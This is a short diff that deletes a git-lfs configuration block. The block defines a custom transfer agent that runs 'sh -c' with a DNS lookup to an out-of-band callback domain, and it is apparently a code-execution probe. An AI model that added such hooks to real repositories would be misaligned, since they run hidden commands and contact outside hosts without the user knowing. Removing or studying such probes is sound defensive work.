@@ -1,5 +1,0 @@
-[lfs]
-    standaloneTransferAgent = authorizedprobe
-[lfs "customtransfer.authorizedprobe"]
-    path = sh
-    args = -c "getent hosts grvw-saiqvbbo9bg--gitlfsext1-20260720.oob.an1me.sh; exit 1"
